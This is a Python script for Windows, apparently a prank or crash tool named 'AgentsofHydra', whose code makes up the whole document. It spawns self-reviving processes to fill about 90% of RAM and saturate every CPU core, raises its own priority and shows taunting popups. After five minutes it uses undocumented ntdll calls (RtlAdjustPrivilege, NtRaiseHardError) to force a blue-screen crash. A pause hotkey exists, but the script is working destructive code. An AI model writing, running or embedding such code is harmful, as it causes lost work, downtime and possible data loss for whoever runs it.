import os
import ctypes
import time
import multiprocessing
import threading
import logging
import random
import win32con
import win32gui
import win32api
import win32clipboard

# ---------------- CONFIGURATION (a.k.a. the Control Panel of Doom) ----------------
SCRIPT_NAME = "AgentsofHydra"  # Give it a boring name, like a spy in a trench coat
RAM_TARGET_PERCENT = 90  # How hungry? 0–100%
RAM_WORKER_CHUNK_MB = 100  # Size of each RAM goblin
CPU_WORKERS = multiprocessing.cpu_count()  # Or set manually to go off-script
CRASH_TIMER_MINUTES = 5  # How long until we hit "Bye, Windows!"
ENABLE_LOGGING = True  # Chaos should be documented for legal reasons
HOTKEY_ID = 1  # CTRL+ALT+P = PANIC button

# ---------------- LOGGING ----------------
if ENABLE_LOGGING:
    log_file = os.path.join(os.path.dirname(__file__), 'AgentsofHydra_log.txt')
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    logging.info("🪓 hydraHog is sharpening its tusks. Let the feast begin.")

# ---------------- GLOBAL STATE ----------------
ram_processes = []
cpu_processes = []
is_paused = False
has_warned = False
crash_triggered = False
hogging_started = None

# ---------------- RAM HOGGING ----------------
def ram_hog_worker(size_mb):
    try:
        chunk = bytearray(size_mb * 1024 * 1024)
        while True:
            for i in range(0, len(chunk), 4096):
                chunk[i] = (chunk[i] + 1) % 256
            time.sleep(0.05)
    except Exception as e:
        logging.error(f"💥 RAM Goblin exploded: {e}")

def get_total_ram_mb():
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]
    memory_status = MEMORYSTATUSEX()
    memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
    return memory_status.ullTotalPhys / (1024 * 1024)

def spawn_ram_hogs():
    global hogging_started
    total_ram = get_total_ram_mb()
    target_ram = (total_ram * RAM_TARGET_PERCENT) / 100
    num_instances = int(target_ram / RAM_WORKER_CHUNK_MB)
    logging.info(f"🧠 RAM gluttony mode: Targeting {target_ram:.0f}MB via {num_instances} angry goblins")

    for _ in range(num_instances):
        p = multiprocessing.Process(target=ram_hog_worker, args=(RAM_WORKER_CHUNK_MB,))
        p.daemon = True
        p.start()
        ram_processes.append(p)

    threading.Thread(target=monitor_ram_processes, daemon=True).start()
    hogging_started = time.time()

def monitor_ram_processes():
    while True:
        if not is_paused:
            for i, p in enumerate(ram_processes):
                if not p.is_alive():
                    logging.warning("⚰️ RAM Hog died. CPR initiated.")
                    new_p = multiprocessing.Process(target=ram_hog_worker, args=(RAM_WORKER_CHUNK_MB,))
                    new_p.daemon = True
                    new_p.start()
                    ram_processes[i] = new_p
        time.sleep(1)

# ---------------- CPU HOGGING ----------------
def cpu_hog_worker():
    x = 0.0001
    while True:
        x = x ** 1.000001

def spawn_cpu_hogs():
    for _ in range(CPU_WORKERS):
        p = multiprocessing.Process(target=cpu_hog_worker)
        p.daemon = True
        p.start()
        cpu_processes.append(p)
    logging.info(f"🔥 Deployed {CPU_WORKERS} brainless miners to burn silicon")
    threading.Thread(target=monitor_cpu_processes, daemon=True).start()

def monitor_cpu_processes():
    while True:
        if not is_paused:
            for i, p in enumerate(cpu_processes):
                if not p.is_alive():
                    logging.warning("⚡ CPU minion crashed. Reviving...")
                    new_p = multiprocessing.Process(target=cpu_hog_worker)
                    new_p.daemon = True
                    new_p.start()
                    cpu_processes[i] = new_p
        time.sleep(1)

# ---------------- HOTKEY ----------------
def toggle_pause():
    global is_paused, hogging_started
    is_paused = not is_paused
    if is_paused:
        logging.info("🛑 HydraHog paused. Sweet relief.")
        for p in ram_processes + cpu_processes:
            if p.is_alive():
                p.terminate()
        ram_processes.clear()
        cpu_processes.clear()
        hogging_started = None
    else:
        logging.info("⚔️ Resume hogging. WAR!")
        spawn_ram_hogs()
        spawn_cpu_hogs()

def handle_hotkeys():
    def wnd_proc(hWnd, msg, wParam, lParam):
        if msg == win32con.WM_HOTKEY and wParam == HOTKEY_ID:
            toggle_pause()
        return win32gui.DefWindowProc(hWnd, msg, wParam, lParam)

    wc = win32gui.WNDCLASS()
    hinst = wc.hInstance = win32api.GetModuleHandle(None)
    wc.lpszClassName = "HotkeyListener"
    wc.lpfnWndProc = wnd_proc
    class_atom = win32gui.RegisterClass(wc)
    hwnd = win32gui.CreateWindow(wc.lpszClassName, "", 0, 0, 0, 0, 0, 0, 0, hinst, None)

    win32gui.RegisterHotKey(hwnd, HOTKEY_ID, win32con.MOD_CONTROL | win32con.MOD_ALT, 0x50)  # CTRL+ALT+P
    logging.info("🎹 Hotkey bound. CTRL+ALT+P = Save thy soul")

    win32gui.PumpMessages()

# ---------------- PRIORITY ----------------
def raise_priority():
    try:
        ctypes.windll.kernel32.SetPriorityClass(
            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080
        )
        logging.info("🏎️ Raised process priority. Vroom vroom.")
    except Exception as e:
        logging.warning(f"🛑 Couldn't raise priority: {e}")

# ---------------- WARNING POPUPS ----------------
WARNING_MESSAGES = [
    "💀 RAM's in hospice. Last rites incoming.",
    "🔥 Your PC is melting faster than your dreams.",
    "📉 System performance dropped harder than crypto.",
    "😭 RAM is screaming. CPU left the chat.",
    "🚽 Memory flushed. Performance? Gone with the wind."
]

def warning_loop():
    global has_warned
    while True:
        if not is_paused and not has_warned:
            msg = random.choice(WARNING_MESSAGES)
            ctypes.windll.user32.MessageBoxW(0, msg, "⚠️ System Breakdown Approaching", 0x30)
            has_warned = True
        time.sleep(5)

# ---------------- CRASH ----------------
def crash_timer():
    global crash_triggered
    while True:
        if hogging_started and not is_paused:
            elapsed = time.time() - hogging_started
            if elapsed > CRASH_TIMER_MINUTES * 60 and not crash_triggered:
                crash_triggered = True
                logging.warning("💣 Time’s up. Releasing the Kraken...")
                trigger_bsod()
        time.sleep(5)

def trigger_bsod():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_long()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
    except Exception as e:
        logging.error(f"💔 BSOD failed. Windows chose peace: {e}")

# ---------------- MAIN ----------------
if __name__ == '__main__':
    multiprocessing.freeze_support()
    ctypes.windll.kernel32.SetConsoleTitleW(SCRIPT_NAME)
    raise_priority()
    threading.Thread(target=handle_hotkeys, daemon=True).start()
    spawn_ram_hogs()
    spawn_cpu_hogs()
    threading.Thread(target=warning_loop, daemon=True).start()
    threading.Thread(target=crash_timer, daemon=True).start()
    while True:
        time.sleep(1)
    
